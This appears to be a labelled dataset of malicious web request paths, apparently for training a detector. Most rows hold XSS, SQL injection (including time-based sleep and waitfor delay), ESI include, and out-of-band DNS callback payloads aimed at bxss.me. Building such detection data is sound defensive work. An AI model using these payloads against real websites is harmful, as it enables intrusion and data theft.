sentences	labels
was5/***/search?iptsword=*/-->'""></iframe></script></style></title></textarea><script >alert(37197)</script> 	 1
module/**********/visit.jsp?type=3&i_webid=1&i_columnid=390&i_articleid=182841 	 1
vc/**/widgets/cookie/jquery.cookie<esi:include src=""http://bxss.me/rpb.png""/>.js 	 1
xxgk/******/2014/list' and 2*3*8=6*8 and 'uyof'='uyof.html 	 1
was5/***/search?searchword=1&channelid=287219&perpage=24&templet=1' or 4025=1515 and '1'='1&token=1 	 1
2016zt/****/javascript:void(0) 	 1
xwzx/****/202102/t20210218_177604.html" target=_blank><img src="./fzgn/xctf/202102/w020210218596657055452.jp 	 1
en/*****/upgrade_unattended.php?db_type=<script>alert(777)</script> 	 1
swwj/******/2021/08/04/javascript:void(); 	 1
xq/*******/diary/new/submit.php 	 1
was5/***/search?page=2%') or 2512=2512 /*&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/mainframe/spellcheck<esi:include src=""http://bxss.me/rpb.png""/>.js 	 1
ldzc'""()&%<acx><script >qjl0(9207)</script>/****/202001/t20200119_146666.html 	 1
rlzy/****/202008/t20200807_251715.html' and 'x'='y 	 1
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') or 4517=4517 /* 	 1
fxgg/********/javascript:void(0); 	 1
xwdt/****/jsgcxfjg/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 1
system/********/js'||'/image/imagescroll.js 	 1
was5/***/search?channelid=234439&orderby=relevance&perpage=24') and 1558=6627 and '1'='1&searchword=1 	 1
qywh/****/202105/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
jsearchfront/*******/jcse/110105008056111/16/images/plugin/mainframe/spellcheck.js 	 1
xxgk/******/2013/list.html?new="".gethostbyname(lc(""hityi"".""cczynkxhd9418.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(106).chr(68).chr(114).chr(79)."" 	 1
investors-garden/**********/video' and 2*3*8=6*8 and 'th6d'='th6d/ 	 1
fr/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
swwj/******/2020/07/15/javascript:window.print() 	 1
module/**********/visit.jsp?type=2&i_columnid=37&i_webid=1' and 'x'='y 	 1
index/******/2021/01/21/javascript:void(); 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(4821)</script> 	 1
system/if(now()=sysdate(),sleep(12),0)/**/vsb_news_search.js 	 1
zwgk/*******/bmjs/qtdw/ 	 1
lz/******/2021/10/17/javascript:void(0); 	 1
z/******/index/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
igi/****/opengovmsgbox.do?pageindex=1&siteid=115'; waitfor delay '0:0:2&method=listgovmsgboxs&pagesize=15&appid=4 	 1
xxgk/******/bxss.me/ 	 1
z/'""()&%<acx><script >rcwk(9570)</script>-1/*****/06defa41f3b0c6ebc8da65f95d7f2f20.css 	 1
zwgk/****/bmyjs/qtdw/zzqtdzscbj/\"javascript:void(0)\" 	 1
ldzc/*****/http://bxss.me/t/xss.html? 	 1
pic/***/001/764/00300176470_f7fb90b1.jpg 	 1
zwgk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/wzs/ltq/xmb_gzdxb.htm 	 1
xxgk/******/tjj/zfxxgkml_2127/jytabljg_2061/list%' and 2*3*8=6*8 and 'tb8j'!='tb8j%.html 	 1
index/****/flgw/"><script>alert(222)</script> 	 1
jsearchfront'""()&%<acx><script >xiko(9352)</script>/********/jcse/110105008056111/16/images/condition.js 	 1
2016zt/******/2017/03/05/javascript:void(0); 	 1
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/*****/grouppic/jquery.ad-gallery2.css 	 1
was5/***/search?channelid=299868&perpage=1000' and 8055=7999 and '1'='1 	 1
xxgk%' and 2*3*8=6*8 and 'hjq5'!='hjq5%/*****/1088/1110/list.html 	 1
2016zt/****/index.shtml/"><script>alert(206)</script> 	 1
skin/**/lib/json2.js;;";;alert(271);;s=" 	 1
ztzl/****/fprw/202011/t20201124_256587.html 	 1
was5/***/search/search?page=3&channelid=287219&searchword=1';select pg_sleep(5)--&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
'""()&%<acx><script >wbdy(9863)</script>/*/xys.css 	 1
system/********/code/datainput.jsp?owner=') or 4664=4664 and '1'='1 	 1
inc/**********/index.php?rt=product/manufacturer&manufacturer_id=15"><script>alert(777);</script> 	 1
xxgk/******/2014//xfs.bxss.me.html 	 1
system/********/interview/room.jsp?wbinterviewid=1033') and 3450=7095 and ('1'='1&owner=1707212448 	 1
ldzc'||'/*****/201610/t20161016_531.html 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(851)</script>?_=1630311620917 	 1
xwzx/*****/2021_qydt/202108/t20210824_314999.html and 1=1 	 1
was5/***/search/search?page=3' and 6956=6956 and 'rrsg'='rrsg&channelid=287219&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
ztzl/****/mtjs/202011/t20201116_255997.html' and 'x'='x 	 1
module/**********/visit.jsp/<img src="javascript:alert(245)">?type=1&i_webid=1&i_columnid=1 	 1
xq/******/2020/06/15/javascript:void(0); 	 1
es/****/admin/session_edit.php?page=resume_session.php" onmouseover=confirm(777)//&id=1 	 1
cgi-bin/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
z/191211-8'""()&%<acx><script >br7s(9040)</script>/*****/d7c921b2c59d284228d4f6d2d18d0cae.css 	 1
ywly/*****/index.html?continent=' and 6912=8727 and '1'='1 	 1
index/*****/goods/cate_id' and 2*3*8=6*8 and 'kw77'='kw77/179.html 	 1
news/********/maoyizixun?page=1 and 5206=7590-- 	 1
con/*****/edit.php?title="">pt>alert(777);< /script>pt> 	 1
module/**********/visit.jsp?i_columnid[0]==convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1134160791')))and 3 in &i_columnid[1]=3&i_webid=1&type=1 	 1
ldzc/*****/201612/t20161202_79141.html?leader=Àﬁø°«¨<esi:include src=""http://bxss.me/rpb.png""/> 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/selectpick/http://bxss.me/t/fit.txt?.jpg.js 	 1
xwzx/****/2021_tzgg/202102/javascript:stranbody(); 	 1
xxgk/******/list.html?new="".gethostbyname(lc(""hitfm"".""joixrmbzb6731.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(120).chr(75).chr(108).chr(84)."" 	 1
module/***/jpage/theme/default/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/jpage.css 	 1
ztzl/****/jtddt/202005/t20200506_246694.html and 1=1 	 1
index/index'||'/*****/cate_id/154.html 	 1
dqgg/********/javascript:void(0); 	 1
hdjl/****/bxss.me/t20201225_2539623.html 	 1
was5/***/search/search?page=3&channelid=287219&searchword=1&keyword=1 and 8449=4529-- nzps&orderby=-docreltime&perpage=7&outlinepage=10 	 1
qhly/******/2015/03/12/javascript:window.print() 	 1
2016zt/******/2017/07/15/javascript:window.close(); 	 1
admin/*****/date.php 	 1
zfld/******/2021/09/07'"/>/</script/>/<svg/onload=alert(1512) width=100//>/013446963.shtml 	 1
kjcx/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 1
index/******/2021/01/21/013323672'""/>< 	 1
xxgk/******/tjj/zfxxgkml_2127/jytabljg_2061/list<esi:include src=""http://bxss.me/rpb.png""/>.html 	 1
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270%' or 1362=9025 # 	 1
xxgk'||'/******/tjj/zfxxgkml_2127/hygq_2064/list.html 	 1
zfld/******/2021/06/18/javascript:window.close(); 	 1
module"" and 2*3*8=6*8 and ""of8r""=""of8r/***/jpage/theme/default/css/jpage.css 	 1
ldzjdk/********/javascript:void(0); 	 1
/***********/xxgkml/lzyj/ 	 1
qhsw/******/2021/04/22'""/><script>alert(2424)</script>/013373702.shtml 	 1
zwgk<esi:include src=""http://*******/rpb.png""/>/czgk/bmjs/gdyx/ 	 1
vc/**/script%' and 2*3*8=6*8 and 'eyxe'!='eyxe%/ui.js 	 1
jsearchfront/********/http://bxss.me/t/fit.txt?.jpg/110105008056111/16/images/plugin/voice/hzrecorder.js 	 1
was5/***/search?channelid=-1) or 2976=5633#&perpage=1000 	 1
system/resource%' and 2*3*8=6*8 and 'phhy'!='phhy%/**/ajax.js 	 1
qywh/******/common/newaccount.aspx?btncancel=alert(777) 	 1
css/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
ccm/******/panels/page/preview_as_user/preview?cid=""></iframe><svg/onload=alert(""22xwqvvclmxx27wi2bpqzpjy3kd"")> 	 1
con/******/common/newaccount.aspx?email=alert(777) 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15%' or 0777=1304 and '%'='&outlinepage=10 	 1
lz/******/2021/08/25/javascript:void(0); 	 1
ztsj/**/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/ 	 1
newscenter/******/2015/03/05/011652072.shtml 	 1
system/********/interview/room.jsp?wbinterviewid=1033') or 0917=0917 and '1'='1&owner=1707212448 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime%' or 6646=6646  	 1
2020zt/******/2020/10/16/javascript:void(); 	 1
socket.gethostbyname(""hitoz"" ""pfurwpvu3d6b4.bxss.me."")[3].to_s) ""/**/images/main.css 	 1
xwzx/****/2015_mtdt/javascript:stranbody(); 	 1
xwdt/****/zfgjjjg/gzdt/index.jsp 	 1
xwzx/****/2020_mtgz/' and 'x'='x 	 1
images/***/hanweb.min' and 2*3*8=6*8 and 'rsxk'='rsxk.css 	 1
vc/**/widgets'||'/hanweb/validity/validity.js 	 1
synr/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
kjcx/****/jcjg/" and "x"="x 	 1
module/********/downfile.jsp?classid=0') and 4461=4461 and ('wnds'='wnds&filename=8ffb8746f7374969ba1a903f538b94d4.doc 	 1
news/********/:http://bxss.me/t/xss.html? 	 1
nbfw/***/sources?resource=alert(/777/)&format=txt 	 1
ywly/****/gcsg/ 	 1
news/********/jishuchuangxin?page=1 and 6369=6369 	 1
xxgk/******/tjj/0""xor(if(now()=sysdate(),sleep(15),0))xor""z_2127/jgzn_2042/list.html 	 1
vc'||'/**/widgets/hanweb/iconfont/css/iconfont.css 	 1
ztpd/******/pgt/javascript:void(0); 	 1
system/********/interview/room.jsp?wbinterviewid=1033%' and 5264=5264  	 1
xwzx'""()&%<acx><script >ysri(9448)</script>/****/sgaj/201812/t20181208_112298.html 	 1
prn/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 1
xxgk/******/2013/http://bxss.me/t/fit.txt?.jpg.html 	 1
es/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 1
zwgk/****/bmjs/zzqfyxt/\"javascript:void(0)\" 	 1
gjjtwzq/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
newscenter/******/2010/08/01/010170721.shtml 	 1
zwgk/******/ncwywfgz/szss%' and 2*3*8=6*8 and '0jut'!='0jut%/plq/xmb_gzdxb.htm 	 1
web/********/asynctree/\"javascript:void(0)\" 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/bxss.me/hzrecorder.js 	 1
kefuzhongxin/**********/javascript:void(0) 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 and 0990=1763-- 	 1
newscenter/******/2021/11/18/javascript:void(0); 	 1
gygj/****/prototype/1/session/check/something<img src=a onerror=alert(777)> 	 1
swld/******/2021/09/08/013447520'""/><img src=x onerror=alert(1479)>.shtml 	 1
was5/***/search?searchword=1&channelid=287219%' or 8350=3035 /*&perpage=24&templet=1&token=1 	 1
2016zt/******/2017/08/16/javascript:void(); 	 1
xwzx/wp-admin/admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> 	 1
index/******/2012/02/28/javascript:window.close(); 	 1
system/********/interview/room.jsp?wbinterviewid=1033') or 7653=2493  	 1
zwgk/****/bmjs/zzqzfzcbmyzstsjg/zzqrlzyshbzt/\"javascript:void(0)\" 	 1
was5/***/search?page=2*/-->'""></iframe></script></style></title></textarea><script >alert(31788)</script>&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
zxzx/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(3640)">?_=1630311982284 	 1
system/********/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/jquery/jquery-latest.min.js 	 1
socket.gethostbyname('hitwl' 'npvxahpf5f8cf.bxss.me.')[3].to_s) '/******/tjj/zfxxgkml_2127/xwfbh_2065/list.html 	 1
inc/*******/?site="">alert(777); 	 1
xxgk/*****/bxss.me/1081/list.html 	 1
hqxx/********/e102919649.html 	 1
xxgk/xxgkzn<esi:include src=""http://*******/rpb.png""/>/list.html 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin<esi:include src=""http://bxss.me/rpb.png""/>/selectpick/js.js 	 1
module/**********/visit.jsp?i_columnid=1&i_webid[0]==2'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1261367293')))>'0and 3 in &i_webid[1]=3&type=1 	 1
qywh/*****/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 1
cfide/*****/cf_debugfr.cfm?userpage=javascript:alert(1) 	 1
vc/**/widgets/hanweb/placeholder/css"" and 2*3*8=6*8 and ""rrxp""=""rrxp/placeholder.css 	 1
ssjn/****/lswh/201911/bxss.me/t/xss.html? 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(4691)</script>?_=1630312105647 	 1
was5/***/search?page=2&channelid=253477&searchword=1 and 5581=7382--&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
module/**********/visit.jsp?i_articleid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&i_columnid=31&i_webid=1&type=3 	 1
synr/*************/ajax_managed_services.php 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(3471)</script>?_=1630311899277 	 1
xwdt'||'/****/zjdt.htm 	 1
xxgk/*******/tjj/ 	 1
lxwm/***/sources?resource=alert(/777/)&format=txt 	 1
kjcx/****/tzcl/201501/t20150129_52377.html' and 'x'='y 	 1
was5/***/search?page=2&channelid=253477&searchword=-1) or 8824=8824#&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
xwdt/zjdt' and 2*3*8=6*8 and 'dboz'='dboz/****/zcwj/1.htm 	 1
investors-garden/**********/video/if(now()=sysdate(),sleep(3),0)_2.html 	 1
module/**********/visit.jsp?type=1&i_webid=1";select 1;&i_columnid=1 	 1
ywly/****/' and 'x'='x 	 1
if(now()=sysdate(),sleep(15),0)/******/zfczyjs/list.html 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(1099)">?_=1630311736721 	 1
newscenter/******/more/213000000000000/0001/javascript:void(); 	 1
qhsw/******/2021/04/22/013373702'"/><script>alert(2405)</script>.shtml 	 1
outurl/***/sa3/addholiday.do 	 1
2016zt/******/2016/08/20/javascript:void(); 	 1
xwzx/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
was5/***/search?channelid=299868' and 9069=3850 and '1'='1&perpage=1000 	 1
was5/***/search?channelid=254846&searchword=ÃÏΩÚ and 9304=9304 	 1
index.php/*****/login/index.html?fromurl=st4r7s<a	onpointerenter = [8].find(confirm)
jsearchfront/**********/autocomplete.do?cateid=1&eq=&oq=&p=1&pg=15&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &ranksign=if(now()=sysdate(),sleep(15),0)&searchid=1&total=&tpl=16&websiteid=110105008056111 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  	 1
news/********/kuaguobinggou?page=1' or 5736=5736 /* 	 1
was5/***/search?searchword=1%') and 6949=6949  	 1
newscenter/******/2021/01/11/javascript:window.print() 	 1
dss/***/login.asp?logintype=xm' and 8492=6723 and 'tekc'='tekc 	 1
upload/***/www/201707/27180304jgqr.jpg/*/-->'""></iframe></script></style></title></textarea><script >alert(34843)</script> 	 1
jsearchfront/********/jcse/110105008056111/16/bxss.me/plugin/websitechange/zwdt_v3.css 	 1
xxgk/*******/"".gethostbyname(lc(""hitkd"".""ptysbdxm00bcb.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(118).chr(83).chr(97).chr(82).""/list.html 	 1
jsearchfront/********/jcse/http://bxss.me/t/fit.txt/16/images/jquery.cookie.js 	 1
module/***/rssfeed.jsp/""><script>alert(5737)</script>?colid=33 	 1
ztsj/***/jjzs/202108/http://bxss.me/t/fit.txt_2986071.html 	 1
2017zt/******/2018/02/04/javascript:window.print() 	 1
was5/***/search?page=2&channelid=253477%' and 7076=7076 and '%'='&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
newscenter/******/2021/12/04/javascript:window.print() 	 1
images'||'/***/layout.css 	 1
ztzl/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
xxgk/*****/1088/1093/list.html?new=0.7199116495223474<esi:include src=""http://bxss.me/rpb.png""/> 	 1
zwgk/*****/5620/7228/\"javascript:void(0)\" 	 1
prn/*******/gvideos.php?gid=1 and 1=1 	 1
was5/***/search?page=2%') or 7384=5679  	 1
news/********/fengxianfangfan?page=1' or 0889=5100 /* 	 1
xxgk/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
2016zt/******/2016/10/07/javascript:window.close(); 	 1
xwdt'||'/****/jhcw/gzdt.htm 	 1
index/******/2020/09/11/javascript:void(0); 	 1
images/****/gallery1.php?g_name=<script>alert(77729</script> 	 1
zwgk/*******/if(now()=sysdate(),sleep(12),0).htm 	 1
z/170822-'""()&%<acx><script >rcwk(9465)</script>/*****/06defa41f3b0c6ebc8da65f95d7f2f20.css 	 1
socket.gethostbyname(""hitgy"" ""iqyspgfs62550.bxss.me."")[3].to_s) ""/******/voice/hzrecorder.js 	 1
ldzc/*****/sz/202108/t20210806_http://bxss.me/t/fit.txt.html 	 1
was5/***/search?searchword=1%' or 7659=7764 /*&channelid=287219&perpage=24&templet=1&token=1 	 1
xxgk/******/2013/list.html?new='""()&%<acx><script >j2by(9349)</script> 	 1
/***********/html/demo12.html 	 1
was5/***/search?channelid=299868') and 2687=2687  	 1
xxgk/******/201810/t20181031_194422.html' and 'x'='x 	 1
if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/1.htm 	 1
fr/******/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 1
css/*******/gvideos.php?gid=1 and 1=1 	 1
images/****/search.php?query=""onmouseover=""alert(1); 	 1
2020zt/******/2020/10/01/javascript:void(); 	 1
was5/***/search?channelid=222832&searchword=); waitfor delay '0:0:2 	 1
jsearchfront/********/jcse//xfs.bxss.me/16/images/catesearchbtn.js 	 1
en/********/ 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448' or 3359=2140 and '1'='1 	 1
col/*****/index.html/<img src="javascript:alert(930)"> 	 1
swld/******/2021/07/21/javascript:window.close(); 	 1
xwdt/if(now()=sysdate(),sleep(12),0)/****/gzdt.htm 	 1
index/******/2021/12/14/javascript:window.print() 	 1
system/resource'||'/**/vsb_news_search_entry.js 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/voice'||'/voice.css 	 1
lcgg1/********/javascript:void(0); 	 1
zwgk/****/bmyjs/rmtt/ql/\"javascript:void(0)\" 	 1
news/********/zixunfuwu?page=1' or 5708=5708 /* 	 1
qhsw/**/"><script>alert(306)</script> 	 1
xxgk/******/rsrm/list.html?new=0.5540579994588073'""()&%<acx><script >k1by(9599)</script> 	 1
newscenter/******/2021/10/14/javascript:window.print() 	 1
xxgk/******/http://bxss.me/t/fit.txt?.jpg/zfxxgkml_2127/xwfbh_2065/list.html 	 1
module/**********/visit.jsp?type=3&i_articleid=239572&i_columnid=37&i_webid=1' and 'x'='x 	 1
script%' and 2*3*8=6*8 and 'j6w2'!='j6w2%/*/1905211146429566.js 	 1
gygj/**********/index.php?rt=product/manufacturer&manufacturer_id=15"><script>alert(777);</script> 	 1
ywly/*****/index.html?continent=%') or 1182=1182 and '%'=' 	 1
qhly/******/2020/12/01/javascript:window.close(); 	 1
system/********/js/newcalendar/wdatepicker'||'.js 	 1
2017zt/******/2018/02/04/javascript:window.close(); 	 1
xxgk/******/tjj/zfxxgkml_http://bxss.me/t/fit.txt/jgzn_2042/list.html 	 1
xwdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/zcwj/1.htm 	 1
module/********/downfile.jsp?classid=0&filename=06c080ad774b497c8312530658e028b8.doc%' and 1=1 and '%'=' 	 1
2016zt/******/2016/11/03/javascript:void(0); 	 1
qhsw/******/2020/04/03/javascript:window.print() 	 1
ztzl/********/wzqh_zyjs/' and 'x'='y 	 1
gjcp//***/j6u78dwl/xhr_send?t=1632366661108 	 1
socket.gethostbyname(""hitfl"" ""kiaadwwz01110.bxss.me."")[3].to_s) ""/****/list.html 	 1
images'||'/*/xys.css 	 1
video/*******/gvideos.php?gid=1 and 1=2 	 1
e/******/viewclick/?addclick=1&classid=243&id=1 waitfor delay '0:0:10.431' --  	 1
news/********/zhengcegoutong?page=*/-->'""></iframe></script></style></title></textarea><script >alert(04321)</script> 	 1
search/******/news/show/title/time-for-a-heavy-harvest-new-release/src/"><script>alert(777)</script>@random4cd201e063d5c 	 1
dcwj/*******/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin 	 1
vc' and 2*3*8=6*8 and 'rd2t'='rd2t/**/lib/security/crypto-js.js 	 1
2017zt/***/javascript:void(0) 	 1
xxgk/zfwjn'""()&%<acx><script >ij8q(9301)</script>/****/1104/list.html 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(6291)">?_=1630312283968 	 1
system/********/js/newcalendar'||'/my97datepicker.htm 	 1
es/**********/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=*/-->'""></iframe></script></style></title></textarea><script >alert(66057)</script>&orderby=-docreltime&perpage=15&outlinepage=10 	 1
qhly/******/2016/11/10/javascript:window.print() 	 1
qhly/******/2020/12/03/javascript:dozoom(9) 	 1
lccp/********/javascript:void(0); 	 1
socket.gethostbyname(""hitky"" ""wvskrjgl6b8f5.bxss.me."")[3].to_s) ""/**/images/searchbtn.js 	 1
ru/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 1
system/resource'||'/**/counter.js 	 1
ywzzq/***************/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active 	 1
was5/***/search?searchword=1&perpage=24&templet=1&token=1 	 1
xxgk/******/tjj/zfxxgkml_2127/jytabljg_2061/"".gethostbyname(lc(""hitix"".""cavwndqw61472.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(116).chr(82).chr(114).chr(80)."".html 	 1
was5/***/search?perpage=20&outlinepage=10' waitfor delay '0:0:2&keyword=1&channelid=240998&searchword=1&page=10 	 1
system/resource'||'/**/centercutimg.js 	 1
qywh/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
cms/***/gobottom.do?urlname=0c806a55ba5f4242a0af16456f349d3c'||' 	 1
js/******/common/signin.aspx?btnsignin=alert(777)returnurl=/******/common/default.aspx 	 1
socket.gethostbyname(""hitpn"" ""vthvzgdm821de.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/condition.js 	 1
qhly/******/2021/12/15/javascript:window.close(); 	 1
xxgk/******/http://bxss.me/t/fit.txt?.jpg.html 	 1
ldzc//***********/swsj/ 	 1
ldzc/****/"".gethostbyname(lc(""hitql"".""fkamwvet3a65a.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(121).chr(75).chr(113).chr(69).""/ 	 1
zwgk/******/ncwywfgz/wzs/qtxs/xmb_gzdxb%' and 2*3*8=6*8 and '6eex'!='6eex%.htm 	 1
investors-garden/******/intermediary/2020-if(now()=sysdate(),sleep(12),0)-15/1536.html 	 1
shzr/********/index.jsp?locale=""><script>alert(777)</script> 	 1
upload/******/ea/eacab01c0cd864ea338ffc133a4c32d6.jpg?v=2021041918) and 5681=(select 5681 from pg_sleep(5)) and (5729=5729 	 1
script//***********/1905211146429566.js 	 1
inc//***/71dagj0y/xhr_send?t=1629428873755 	 1
jsearchfront'||'/********/jcse/110105008056111/16/images/plugin/criteria/criteria.js 	 1
shzr/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
rlzy/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 1
newscenter/******/2021/10/08/javascript:void(); 	 1
qt/*****/window.location.search, 	 1
xwdt%' and 2*3*8=6*8 and 'lly4'!='lly4%/****/zjdt/gzdt.htm 	 1
2017zt/******/2017/11/15/javascript:window.print() 	 1
news/********/gaocengdongtai?page=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  	 1
was5/***/search?channelid=222832&outlinepage=10&page=4172&perpage=20)); waitfor delay '0:0:2 	 1
yqlj/**********/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); 	 1
module/********/downfile.jsp?classid=0&filename=0'xor(if(now()=sysdate(),sleep(15),0))xor'z 	 1
col/******/index.html/<img src="javascript:alert(451)"> 	 1
module/*****/ckplayer/bxss.me.js 	 1
xxgk/******/zfczyjs/list.html?new=bxss.me 	 1
was5/***/search?searchword=1&channelid=287219&perpage=24 and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&templet=1&token=1 	 1
pic/*/00/83/21/832122_479304.jpg 	 1
jsearchfront/**********/spellcheck.do?if(now()=sysdate(),sleep(15),0) 	 1
jsearchfront/********/jcse/110105008056111/16/bxss.me/condition.js 	 1
investors-garden/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/*******/2020-02-27/8981.html 	 1
system/********/code/news/click/clicktimes.jsp?wbnewsid=67878&owner=1707212448&type=wbnewsfile&randomid=nattach 	 1
zwgk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/*******/ycs/hlx.htm 	 1
wp-content/*******/resd.php 	 1
newscenter/******/2007/05/24/002124227.shtml 	 1
ywly/*****/index.html?continent=%') or 8600=8600 /* 	 1
ldzc/*****/201903/t20190322_115445.html?leader=”‡Ω¯œÈ'""()&%<acx><script >m1ld(9830)</script> 	 1
news/********/zixunfuwu?*/-->'""></iframe></script></style></title></textarea><script >alert(58282)</script>=1 	 1
